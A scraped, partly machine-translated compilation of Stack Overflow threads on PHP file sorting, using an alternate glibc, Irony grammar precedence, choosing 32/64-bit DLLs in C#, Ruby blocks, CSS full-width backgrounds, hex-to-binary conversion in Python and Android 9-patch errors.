我有这段代码可以工作，但是我想将函数更改为“按名称排序”而不是“按日期排序”。

下面的代码不是我的（请参考[PHP Sort function by date (JWPLAYER auto playlist script)](https://stackoverflow.com/questions/10751794/php-sort-function-by-date-jwplayer-auto-playlist-script)）

```
$folder = scandir($path);
$files = array();
foreach($folder as $file){
    if($file == '.' OR $file == '..' OR $file == 'index.htm'){}else{
        $files[$file] = filemtime($path.'/'.$file);
    }
}
arsort($files); 
```

谢谢

总结。

有了以上所有信息，您可以使用 JW Player 来：

*   扫描文件夹中的视频文件并自动创建 XML 播放列表
*   按日期排序或按名称排序

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:22:38.593

代替

```
$files[$file] = filemtime($path.'/'.$file); 
```

和

```
$files[] = $path.'/'.$file; 
```

你可能想`arsort`用`asort`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:24:13.057

如果`$files`包含文件名作为键，则替换

```
arsort($files); 
```

和

```
ksort($files); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:24:35.740

使用`ksort`代替`arsort`

因为[k(key)sort](http://php.net/manual/de/function.ksort.php)将按键而不是按值对数组进行排序。

# python - use different glibc version

> ID：10757975
> 
> 赞同：9
> 
> 时间：2012-05-25T16:18:14.507
> 
> 标签：python, glibc, epoll

Currently I have glibc which does not support epoll, so I installed new glibc at non default lation which supports epoll. I have python program which uses this epoll.

I tried to set LD_LIBRARY_PATH

`export LD_LIBRARY_PATH="/home/glibc/lib:$LD_LIBRARY_PATH"`

then I run ls, it gave me errors

`ls: /home/glibc/lib/tls/libc.so.6: version 'GLIBC_2.4' not found (required by /lib/libpam.so.0)`

`ls: /home/glibc/lib/tls/libc.so.6: version 'GLIBC_2.4' not found (required by /lib/libpam_misc.so.0)`

Also when I tried to run python I got

`python: relocation error: /home/glibc/lib/tls/libc.so.6: symbol _dl_out_of_memory, version GLIBC_PRIVATE not defined in file ld-linux.so.2 with link time reference`

How can I use newly installed glibc instead of default one?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2017-07-16T20:08:44.360

您需要使用动态链接器的显式调用，因此如下所示：

```
/home/glibc/lib/ld-linux-x86-64.so.2 --library-path /home/glibc/lib /usr/bin/python 
```

（但`GLIBC_2.4`符号版本不可用的事实表明新的 glibc 存在严重问题，或者它实际上根本不是新的，早于 glibc 2.4。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-09-19T13:40:04.153

如果你自己编译了 glibc，你的构建目录中应该有 testrun.sh 脚本。这比使用 ld-linux.so 更简单、更可靠：

```
build/testrun.sh ls 
```

# c# - 具有讽刺意味的运算符优先级和一元运算符

> ID：10757981
> 
> 赞同：0
> 
> 时间：2012-05-25T16:18:23.820
> 
> 标签：c#, parsing, irony

我在让我的语法与一元运算一起工作时遇到问题。例如，如果我输入“-5/2”，我会得到 -(5/2)，而不是我想要得到的 (-5)/2。在这种特殊情况下，差异并不重要，但是，我仍然认为解决这个问题对语法很重要。

但是，将 1-5/2 get 解析为 1-(5/2) 而不是 (1-5)/2 也很重要。

目前我注册了以下运营商：

```
 RegisterOperators(1, "||");
        RegisterOperators(2, "&&");
        RegisterOperators(3, "|");
        RegisterOperators(4, "^");
        RegisterOperators(5, "&");
        RegisterOperators(6, "==", "!=");
        RegisterOperators(7, "<", ">", "<=", ">=", "is");
        RegisterOperators(8, "<<", ">>");
        RegisterOperators(9, "+", "-");
        RegisterOperators(10, "*", "/", "%");
        RegisterOperators(11, "!");
        RegisterOperators(-1, "?");
        RegisterOperators(-2, "=", "+=", "-=", "*=", "/=", "%=", "&=", "|=", "^=", "<<=", ">>="); 
```

not 运算符已经按照我的意愿工作，但是，“+”和“-”类型需要在它们所在的位置，以确保正确解释“*”、“/”和“%” . 我应该如何解决这个问题？顺便说一句，如果您需要更多语法，请告诉我，我只是认为我不需要在这里丢弃更多的代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T18:51:30.643

经过一番尝试，我想出了一个解决方案：

```
UnaryExpr.Rule = ImplyPrecedenceHere(30) + LUnOp + Expr; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-04T23:14:47.547

这对我有用

```
UnaryExpr.Rule = LUnOp + Expr + ReduceHere(); 
```

# c# - Dynamically calling 32-bit or 64-bit DLL from c# application using Environment.Is64BitProcess

> ID：10757984
> 
> 赞同：4
> 
> 时间：2012-05-25T16:18:31.247
> 
> 标签：c#, .net-4.0

I am working on a project written in C# for .NET 4.0 (via Visual Studio 2010). There is a 3rd party tool that requires the use of a C/C++ DLL and there are examples for 32-bit applications and 64-bit applications in C#.

The problem is that the 32-bit demo statically links to the 32-bit DLL and the 64-bit demo statically links to the 64-bit DLL. Being a .NET application it could run as either a 32-bit or 64-bit process on the client PCs.

The .NET 4.0 framework provides the Environment.Is64BitProcess property that returns true if the application is running as a 64-bit process.

What I would like to do is to dynamically load the correct DLL after checking the Is64BitProcess property. However, when I research dynamically loading libraries I always come up with the following:

```
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string dllToLoad);

[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

[DllImport("kernel32.dll")]
public static extern bool FreeLibrary(IntPtr hModule); 
```

It would appear that these methods are specifically for the 32-bit operating system. Are there 64-bit equivalents?

Would it cause problems to statically link both the 32-bit and 64-bit libraries as long as the appropriate methods are called based on the Is64BitProcess check?

```
public class key32
{
    [DllImport("KEYDLL32.DLL", CharSet = CharSet.Auto)]
    private static extern uint KFUNC(int arg1, int arg2, int arg3, int arg4);

    public static bool IsValid()
    {
       ... calls KFUNC() ...
    }
}

public class key64
{
    [DllImport("KEYDLL64.DLL", CharSet = CharSet.Auto)]
    private static extern uint KFUNC(int arg1, int arg2, int arg3, int arg4);

    public static bool IsValid()
    {
       ... calls KFUNC() ...
    }
} 
```

...

```
if (Environment.Is64BitProcess)
{
    Key64.IsValid();
}
else
{
    Key32.IsValid();
} 
```

Thank you!!

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T16:31:24.843

很多方法可以做到这一点：

*   这是一个*部署*问题，只需获取安装程序复制的正确 DLL，给它们起相同的名称

*   很少有程序真正需要 64 位代码提供的海量地址空间。只需将平台目标设置为 x86

*   使用 [DllImport] 属性的 EntryPoint 字段。将其设置为“KFUNC”。并给方法不同的名称。现在您可以根据 IntPtr.Size 的值调用其中一个或另一个

演示最后一个解决方案：

```
[DllImport("KEYDLL32.DLL", EntryPoint = "KFUNC")]
private static extern uint KFUNC32(int arg1, int arg2, int arg3, int arg4);

[DllImport("KEYDLL64.DLL", EntryPoint = "KFUNC")]
private static extern uint KFUNC64(int arg1, int arg2, int arg3, int arg4);

...

if (IntPtr.Size == 8) KFUNC64(1, 2, 3, 4);
else                  KFUNC32(1, 2, 3, 4); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:30:19.370

讽刺的是，在 64 位系统上，`kernel32.dll`（驻留在 中`%windir%\System32\`）是 64 位版本，而`%windir%\SysWOW64\`版本是 32 位系统。非常不幸的命名在这里发生......

无论如何，您可以做的是绑定到*两个*版本，使用我链接它们的路径，绑定到两个不同的变量名称（例如，`LoadLibrary`版本`system32`和`LoadLibrary32`版本`syswow64`）。然后在 32 位系统上就可以使用`LoadLibrary`，如果检测到 64 位系统，`LoadLibrary`将是 64 位版本，而`LoadLibrary32`将是 32 位版本。

然而，我质疑这会对你有所帮助，因为我认为你不能动态绑定到不匹配的位数（我会用这个*词*！）动态库......我猜这会帮助你的第二个例子，你实际上确实得到了两个不同的库，每个案例一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:33:16.590

我不会这样做低级互操作，而是考虑使用更多的 .Net 路由 - 使用类似插件的程序集来处理它。

*   创建 2 个链接到 DLL 的 x86 和 x64 版本的程序集（并为正确的平台编译）。
*   使这些程序集公开实现相同接口的类（或使它们相同的其他方式）。确保其余代码可以使用任何一个库，可能需要带有基本类型/接口的第三个程序集。
*   在运行时手动加载您需要的程序集。确保它不会恰好在搜索路径中，以避免错误地自动加载。

请注意，您的第二种方法（基于位数选择方法）应该可以正常工作。我仍然会将对每个 DLL 的所有访问封装在具有相同接口的类中，并确保在运行时只能实例化正确的一个。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-11T15:27:51.123

将 dll 保存在两个不同的目录中并动态调用它们。

Libs64\ABC.dll
Libs32\ABC.dll

# ruby - Save and re-use block for method calls

> ID：10757991
> 
> 赞同：12
> 
> 时间：2012-05-25T16:18:57.160
> 
> 标签：ruby

I am calling the [RestClient::Resource#get(additional_headers = {}, &block)](http://rubydoc.info/gems/rest-client/frames) method multiple times with the same block but on different Resources, I was wondering if there is a way to save the block into a variable, or to save it into a Proc convert it into a block each time.

**Edit:**

I did the following:

```
resource = RestClient::Resource.new('https://foo.com')
redirect  =  lambda do  |response, request, result, &block|
  if [301, 302, 307].include? response.code
     response.follow_redirection(request, result, &block)
   else
      response.return!(request, result, &block)
   end
end
@resp = resource.get (&redirect) 
```

I get: `Syntax error, unexpected tAMPER`

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-05-25T16:21:12.343

```
foo = lambda do |a,b,c|
   # your code here
end

bar.get(&foo)
jim.get(&foo)
jam.get(&foo) 
```

在方法调用中的项目前面放置一个 & 符号，例如`a.map!(&:to_i)`调用该`to_proc`对象上的方法并将生成的 proc 作为块传递。定义可重用块的一些替代形式：

```
foo = Proc.new{ |a,b,c| ... }
foo = proc{ |a,b,c| ... }
foo = ->(a,b,c){ ... } 
```

如果您正在使用块调用方法并且想要保存*该*块以供以后重复使用，您可以通过在方法定义中使用＆符号将块捕获为 proc 参数来实现：

```
class DoMany
  def initialize(*items,&block)
    @a = items
    @b = block # don't use an ampersand here
  end
  def do_first
    # Invoke the saved proc directly
    @b.call( @a.first )
  end
  def do_each
    # Pass the saved proc as a block
    @a.each(&@b)
  end
end

d = DoMany.new("Bob","Doug"){ |item| puts "Hello, #{item}!" }

d.do_first
#=> Hello, Bob!

d.do_each
#=> Hello, Bob!
#=> Hello, Doug! 
```

# html - Centered fixed-width layout with elements extending over the whole page

> ID：10757993
> 
> 赞同：0
> 
> 时间：2012-05-25T16:19:01.623
> 
> 标签：html, css

I have a page with a centered fixed-width layout. I do this by wrapping everything in a `div`, adding a fixed width and `margin: auto`. But then I have headings that shall have a background that extends over the whole page (only the background). Is there a way to do this at all (without breaking up the single fixed-width+margin auto div into many many divs)?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T17:01:10.437

类似，但又是一个简单且可用的解决方案的示例：http: [//jsfiddle.net/grE5A/41/](http://jsfiddle.net/grE5A/41/)

```
#main_container {
    width:400px;
    min-height:360px;
    margin:10px auto;
    background:#000;
    overflow:visible;
}

#heading_div_bg {
    background-color:green;
    height:50px;
    width:100%;
    position:absolute;
    margin:0px auto;
    left:0px;
    top:50px;
}

#heading_div {
    background-color:darkgreen; /*set to same as header_div*/
    text-align:center;
    height:50px;
    width:400px; /*same as container*/
    position:relative;
    margin: 0 auto;  
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:28:29.907

不是很优雅，但这是一个解决方案： http: [//dabblet.com/gist/2789029](http://dabblet.com/gist/2789029) - 它使用巨大的负边距和相等的填充。

这可以解决问题：

```
body {
    overflow-x: hidden;
}
.central {
    width: 400px;
    margin: 0 auto;
    outline: solid 1px red;
}
h1 {
    margin: 5px -2000px;
    padding: 5px 2000px;
    outline: solid 1px blue;
    background: cyan;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:22:04.193

`div`您可以在这些s上使用绝对定位的伪元素：

```
#main-page {
   width: 50%;
   margin: 0 auto;
}
div.full-width {
   position: relative;
   background: black;
}
div.full-width:before, div.full-width:after {
   content: "";
   position: absolute;
   background: black;  /* Match the background */
   top: 0;
   bottom: 0;
   width: 9999px;   /* some huge width */
}
div.full-width:before {
   right: 100%;
}
div.full-width:after {
   left: 100%;
} 
```

查看本教程：[http ://css-tricks.com/full-browser-width-bars/](http://css-tricks.com/full-browser-width-bars/)

# python - python, from json object (hex) to raw internal binary string

> ID：10757995
> 
> 赞同：0
> 
> 时间：2012-05-25T16:19:08.627
> 
> 标签：python, json, hex, binary-data

in python how can i convert a "json-loaded" object value into raw binary string? ie "0A" to be converted to "1010"?

what i do is the following: read a line from a file, ie assume the file contains this line:

```
{"hex":"0A01145af1ab"} 
```

i read it with then i load it with json library //ok so far

```
data = json.loads(a_line) 
```

then i can use data["hex"],

but i need ie. "0A" to be converted to "1010", and i don't know how to do that i read this [topic](https://stackoverflow.com/questions/8445447/in-python-how-to-convert-a-hex-ascii-string-to-raw-internal-binary-string) which is similar to my problem, but it didn't help me (base64.b16decode(data["hex"]) returns error)

thanks a lot!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:25:20.327

```
>>> bin(int(data['hex'][:2], 16))[2:]
'1010' 
```

也`format(..., 'b')`可以转换为二进制（不带`0b`前缀）

# android - 9-patch not working

> ID：10757997
> 
> 赞同：4
> 
> 时间：2012-05-25T16:19:16.147
> 
> 标签：android, nine-patch

I'm having strange issues with 9-patch png's on Android. It already fails in Eclipse visual editor, no matter which target I use (tried several between 7 and 14). The error log shows the message *main.xml: Index: 0, Size: 0* The exception behind is:

```
java.lang.IndexOutOfBoundsException: Index: 0, Size: 0
at java.util.ArrayList.RangeCheck(ArrayList.java:547)
at java.util.ArrayList.get(ArrayList.java:322)
at com.android.ninepatch.NinePatchChunk.draw(NinePatchChunk.java:185)
at com.android.ninepatch.NinePatchChunk.draw(NinePatchChunk.java:101)
at android.graphics.NinePatch_Delegate$1.draw(NinePatch_Delegate.java:219)
at com.android.layoutlib.bridge.impl.GcSnapshot.drawInLayer(GcSnapshot.java:613)
at com.android.layoutlib.bridge.impl.GcSnapshot.draw(GcSnapshot.java:583)
at android.graphics.NinePatch_Delegate.draw(NinePatch_Delegate.java:217)
at android.graphics.NinePatch_Delegate.nativeDraw(NinePatch_Delegate.java:170)
at android.graphics.NinePatch.nativeDraw(NinePatch.java)
at android.graphics.NinePatch.draw(NinePatch.java:120)
at android.graphics.drawable.NinePatchDrawable.draw(NinePatchDrawable.java:189)
at android.view.View.draw(View.java:10865)
at android.view.ViewGroup.drawChild(ViewGroup.java:2899)
at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2495)
at android.view.ViewGroup.drawChild(ViewGroup.java:2897)
at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2495)
at android.view.ViewGroup.drawChild(ViewGroup.java:2897)
at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2495)
at android.view.View.draw(View.java:10883)
at android.view.ViewGroup.drawChild(ViewGroup.java:2899)
at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2495)
at android.view.ViewGroup.drawChild(ViewGroup.java:2897)
at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2495)
at android.view.View.draw(View.java:10883)
at android.view.ViewGroup.drawChild(ViewGroup.java:2899)
at android.view.ViewGroup.dispatchDraw(ViewGroup.java:2495)
at android.view.View.draw(View.java:10883)
at com.android.layoutlib.bridge.impl.RenderSessionImpl.render(RenderSessionImpl.java:505)
at com.android.layoutlib.bridge.Bridge.createSession(Bridge.java:324)
at com.android.ide.common.rendering.LayoutLibrary.createSession(LayoutLibrary.java:325)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.RenderService.createRenderSession(RenderService.java:372)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.renderWithBridge(GraphicalEditorPart.java:1323)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.recomputeLayout(GraphicalEditorPart.java:1077)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.activated(GraphicalEditorPart.java:903)
at com.android.ide.eclipse.adt.internal.editors.layout.LayoutEditor.pageChange(LayoutEditor.java:399)
at org.eclipse.ui.part.MultiPageEditorPart$2.widgetSelected(MultiPageEditorPart.java:290)
at org.eclipse.swt.widgets.TypedListener.handleEvent(TypedListener.java:240)
at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1258)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1282)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1267)
at org.eclipse.swt.widgets.Widget.notifyListeners(Widget.java:1061)
at org.eclipse.swt.custom.CTabFolder.setSelection(CTabFolder.java:2746)
at org.eclipse.swt.custom.CTabFolder.onMouse(CTabFolder.java:1433)
at org.eclipse.swt.custom.CTabFolder$1.handleEvent(CTabFolder.java:257)
at org.eclipse.swt.widgets.EventTable.sendEvent(EventTable.java:84)
at org.eclipse.swt.widgets.Widget.sendEvent(Widget.java:1258)
at org.eclipse.swt.widgets.Display.runDeferredEvents(Display.java:3588)
at org.eclipse.swt.widgets.Display.readAndDispatch(Display.java:3209)
at org.eclipse.ui.internal.Workbench.runEventLoop(Workbench.java:2701)
at org.eclipse.ui.internal.Workbench.runUI(Workbench.java:2665)
at org.eclipse.ui.internal.Workbench.access$4(Workbench.java:2499)
at org.eclipse.ui.internal.Workbench$7.run(Workbench.java:679)
at org.eclipse.core.databinding.observable.Realm.runWithDefault(Realm.java:332)
at org.eclipse.ui.internal.Workbench.createAndRunWorkbench(Workbench.java:668)
at org.eclipse.ui.PlatformUI.createAndRunWorkbench(PlatformUI.java:149)
at org.eclipse.ui.internal.ide.application.IDEApplication.start(IDEApplication.java:123)
at org.eclipse.equinox.internal.app.EclipseAppHandle.run(EclipseAppHandle.java:196)
at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.runApplication(EclipseAppLauncher.java:110)
at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:79)
at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:344)
at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:622)
at org.eclipse.equinox.launcher.Main.basicRun(Main.java:577)
at org.eclipse.equinox.launcher.Main.run(Main.java:1410)
at org.eclipse.equinox.launcher.Main.main(Main.java:1386) 
```

The 9-patch was created with the draw9patch-tool included in the SDK. I have this issues with all the images I use in this project. I already used 9-patch before in other projects without problems and thus assume there's something specific to the format of my current png's. Maybe the used Photoshop of the designer creates png's which result in invalid 9-patches. Does anybody have an idea what's the issue here?

**update:**

working version:

![enter image description here](../Images/d0d3b44963b7c8b0b95dccb48e804f15.png)

not working version:

![enter image description here](../Images/40729b93b539cf2112977f9187a02e9a.png)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-20T03:20:38.303

您只是错过了设置的内容区域。

在您的 9 补丁 png 的右侧和底部绘制边框。![在此处输入图像描述](../Images/c98be4dc0bbe3c0d241f1b8d8a259da2.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-07-28T12:50:51.243

如果您仅在其中一个文件夹中添加了 9Patch 图像，`drawable-xhdpi`那么它会重现此类错误，您应该将其放在`drawable`文件夹中或所有文件夹中，例如`drawable-hdpi,drawable-mdpi,drawable-xhdpi,drawable-xxhdpi, etc`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T09:08:10.483

似乎已在 SDK 16 / 17 中修复，请参见此处：

[http://code.google.com/p/android/issues/detail?id=39814](http://code.google.com/p/android/issues/detail?id=39814)

和这里：

[http://code.google.com/p/android/issues/detail?id=37472](http://code.google.com/p/android/issues/detail?id=37472)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-05T19:40:00.003

看起来这里的问题是：不工作的版本错过了 2 px 透明边框。然而仍然很奇怪，draw9patch 并没有抱怨这一点并且显示正在工作。